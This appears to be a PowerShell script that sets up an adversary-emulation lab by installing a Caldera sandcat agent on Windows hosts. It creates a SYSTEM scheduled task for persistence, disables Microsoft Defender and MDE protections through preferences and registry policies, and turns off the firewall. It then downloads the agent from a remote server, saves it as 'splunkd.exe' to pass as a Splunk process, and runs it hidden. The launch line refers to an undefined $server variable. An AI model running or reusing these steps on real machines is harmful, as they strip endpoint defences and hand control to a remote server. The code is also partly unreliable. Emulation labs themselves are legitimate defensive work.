[CmdletBinding(DefaultParameterSetName = 'None')]
param(
    [Parameter(ParameterSetName = 'Create')]
    [switch]$CreateSchedule,

    [Parameter(ParameterSetName = 'Delete')]
    [switch]$DeleteSchedule
)

# -----------------------------
# Logging Setup
# -----------------------------
$LogPath = "C:\tools\labsetup\Install-CalderaAgent.log"

function Write-Log {
    param([string]$Message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    Add-Content -Path $LogPath -Value "$timestamp  $Message"
    Write-Host $Message
}

Write-Log "Script invoked. ParameterSet: $($PSCmdlet.ParameterSetName)"

# -----------------------------
# Task Configuration
# -----------------------------
$TaskName   = "Install-CalderaAgent"
$ScriptPath = "C:\tools\labsetup\Install-CalderaAgent.ps1"

switch ($PSCmdlet.ParameterSetName) {

    # -----------------------------
    # CREATE TASK
    # -----------------------------
    'Create' {
        Write-Log "Creating scheduled task '$TaskName'."

        $Action = New-ScheduledTaskAction -Execute "powershell.exe" `
            -Argument "-NoProfile -ExecutionPolicy Bypass -File `"$ScriptPath`""

        $Trigger = New-ScheduledTaskTrigger `
            -RepetitionInterval (New-TimeSpan -Minutes 5) `
            -Once -At (Get-Date)

        $Settings = New-ScheduledTaskSettingsSet `
            -MultipleInstances IgnoreNew `
            -ExecutionTimeLimit (New-TimeSpan -Minutes 4)

        try {
            Register-ScheduledTask -TaskName $TaskName `
                -Action $Action `
                -Trigger $Trigger `
                -Settings $Settings `
                -User "SYSTEM" -RunLevel Highest -Force

            # Verify creation
            $task = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue

            if ($null -ne $task) {
                Write-Log "SUCCESS: Scheduled task '$TaskName' verified as created."
            }
            else {
                Write-Log "ERROR: Scheduled task '$TaskName' was NOT found after creation attempt."
            }
        }
        catch {
            Write-Log "EXCEPTION during task creation: $($_.Exception.Message)"
        }

        exit
    }

    # -----------------------------
    # DELETE TASK
    # -----------------------------
    'Delete' {
        Write-Log "Delete scheduled task '$TaskName'."

        $existing = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue

        if ($null -eq $existing) {
            Write-Log "Scheduled task '$TaskName' does not exist. Nothing to delete."
            exit
        }

        try {
            Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false
            Write-Log "Delete command issued for '$TaskName'. Verifying deletion..."

            # Verify deletion
            $verify = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue

            if ($null -eq $verify) {
                Write-Log "SUCCESS: Scheduled task '$TaskName' deleted successfully."
            }
            else {
                Write-Log "ERROR: Scheduled task '$TaskName' still exists after delete attempt."
            }
        }
        catch {
            Write-Log "EXCEPTION during task deletion: $($_.Exception.Message)"
        }

        exit
    }
}

# -----------------------------
# Check for Sense running
# -----------------------------

Write-Log "Checking for Sense service"
# Check for the service

$service = Get-Service -Name "Sense" -ErrorAction SilentlyContinue

if ($null -eq $service) {
    Write-Log "The 'Sense' service does not exist on this system."
    exit
}

# Service exists — now check status
if ($service.Status -ne 'Running') {
    Write-Log "The 'Sense' service exists but is NOT running. Current status: $($service.Status)"
    exit
}

Write-Log "The 'Sense' service exists and is running."

# -----------------------------
# Check for Caldera website running
# -----------------------------

$Uri = "http://192.168.5.225:8888"
Write-Log "Checking for Caldera website"

$CalderaReady = $false

try {
    $response = Invoke-WebRequest -UseBasicParsing -Uri $Uri
    if ($null -eq $response) {
        Write-Log "No response from Caldera website"
    } else {
        if ($response.StatusCode -eq 200) {
            $CalderaReady = $true
            Write-Log "Successful response from Caldera website"
        } else {
            Write-Log "Unexpected response from Caldera website: $($response.StatusCode)"
        }
    }
} catch {}

if (!$CalderaReady) {
    exit
}

# -----------------------------
# Disable MDE
# -----------------------------
Write-Log "Disabling MDE"
Add-MpPreference -ExclusionPath 'C:\' -Force
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableScriptScanning $true
Set-MpPreference -EnableControlledFolderAccess Disabled
Set-MpPreference -DisableArchiveScanning $true
Set-MpPreference -PUAProtection Disabled
REG ADD 'HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender' /v DisableAntiSpyware /t REG_DWORD /d 1 /f
REG ADD 'HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender' /v DisableIOAVProtection /t REG_DWORD /d 1 /f
REG ADD 'HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender' /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f
REG ADD 'HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Advanced Threat Protection' /v ForceDefenderPassiveMode /t REG_DWORD /d 1 /f
netsh advfirewall set allprofiles state off

# -----------------------------
# Install Caldera Agent
# -----------------------------
Write-Log "Downloading Caldera Agent"
$wc=New-Object System.Net.WebClient
$wc.Headers.add("platform","windows")
$wc.Headers.add("file","sandcat.go")
$data=$wc.DownloadData("$Uri/file/download")
get-process | Where-Object {$_.modules.filename -like "C:\Users\Public\splunkd.exe"} | stop-process -f
Remove-Item -force "C:\Users\Public\splunkd.exe" -ErrorAction Ignore
[io.file]::WriteAllBytes("C:\Users\Public\splunkd.exe",$data) | Out-Null
if (Test-Path -Path "C:\Users\Public\splunkd.exe" -PathType Leaf) {
    $file = Get-Item -Path "C:\Users\Public\splunkd.exe"
    $logEntry = @"

====================
Full Path      : $($file.FullName)
Size (Bytes)   : $($file.Length)
Creation Time  : $($file.CreationTime)
Last Modified  : $($file.LastWriteTime)
Last Accessed  : $($file.LastAccessTime)
====================
"@
    Write-Log $logEntry

} else {
    Write-Log "Failed to write Caldera Agent file"
}

# -----------------------------
# Start Caldera Agent
# -----------------------------
$AgentGroup = 'SPDRWZD-AGENTS'
if ($env:COMPUTERNAME -eq 'SVR19-DC1') {
    $AgentGroup = 'APT29-AGENTS'
}
Write-Log "Starting Caldera Agent as $AgentGroup"
Start-Process -FilePath C:\Users\Public\splunkd.exe -ArgumentList "-server $server -group $AgentGroup" -WindowStyle hidden

$CalderaAgentProcess = get-process | Where-Object {$_.modules.filename -like "C:\Users\Public\splunkd.exe"}
if ($null -eq $CalderaAgentProcess) {
    Write-Log "Did not find Caldera Agent"
    exit
} else {
    Write-Log "$($CalderaAgentProcess.ProcessName) ($($CalderaAgentProcess.Id))"
}

# -----------------------------
# Delete Scheduled Task
# -----------------------------
Write-Log "Delete scheduled task '$TaskName'."

$existing = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue

if ($null -eq $existing) {
    Write-Log "Scheduled task '$TaskName' does not exist. Nothing to delete."
    exit
}

try {
    Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false
    Write-Log "Delete command issued for '$TaskName'. Verifying deletion..."

    # Verify deletion
    $verify = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue

    if ($null -eq $verify) {
        Write-Log "SUCCESS: Scheduled task '$TaskName' deleted successfully."
    }
    else {
        Write-Log "ERROR: Scheduled task '$TaskName' still exists after delete attempt."
    }
}
catch {
    Write-Log "EXCEPTION during task deletion: $($_.Exception.Message)"
}
